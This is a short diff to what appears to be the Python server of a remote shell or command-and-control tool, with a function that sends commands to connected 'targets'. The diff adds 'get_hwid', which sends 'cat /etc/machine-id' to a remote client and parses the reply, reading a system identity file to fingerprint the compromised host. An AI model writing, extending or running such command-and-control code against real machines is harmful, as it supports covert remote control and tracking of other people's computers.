@@ -5,7 +5,6 @@ from configparser import ConfigParser, ParsingError
 from queue import Queue
 from src import source
 
-
 config = ConfigParser()
 queue = Queue()
 
@@ -152,3 +151,12 @@ def send_target_commands(cmd, conn):
     except Exception:
         print("[!] Connection to client was lost")
         return
+
+def get_hwid(conn):
+    try:
+        conn.send(str.encode('cat /etc/machine-id'))
+        client_hwid = str(conn.recv(1024), "utf-8")
+        hwid = client_hwid.split(maxsplit=1)[0]
+        return hwid
+    except socket.error as e:
+        print(f"[!] Connection to client was lost {e}")
